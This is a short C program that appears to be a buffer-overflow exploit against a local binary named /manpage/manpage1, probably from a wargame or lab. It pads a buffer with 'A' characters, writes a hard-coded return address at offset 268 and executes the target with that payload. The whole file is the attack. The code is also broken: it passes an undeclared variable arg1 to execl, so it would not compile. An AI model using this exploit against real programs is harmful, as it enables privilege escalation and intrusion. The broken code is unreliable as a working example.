#include <stdio.h>
#include <signal.h>

void main(){
	char arg[273]; //268 is the overflow spot
	memset(arg,'A',sizeof(arg));
	strncpy(arg+268,"\x59\xdf\xff\xff",5);
	signal(SIGTERM,SIG_IGN);
	execl("/manpage/manpage1","",arg1,NULL);

}
